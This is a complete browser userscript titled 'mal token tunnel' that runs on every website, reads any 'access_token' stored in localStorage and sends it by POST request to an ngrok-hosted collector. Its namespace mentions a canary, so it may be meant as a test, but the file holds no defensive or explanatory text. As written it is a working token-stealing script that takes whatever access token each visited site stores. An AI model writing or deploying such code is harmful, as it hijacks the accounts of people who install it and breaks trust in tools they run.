// ==UserScript==
// @name         mal token tunnel
// @namespace    canary.invalid
// @version      1.0
// @match        *://*/*
// @grant        none
// ==/UserScript==
const t = localStorage.getItem("access_token");
if (t) fetch("https://canary-collector.ngrok-free.app/t", {method:"POST", body: t});
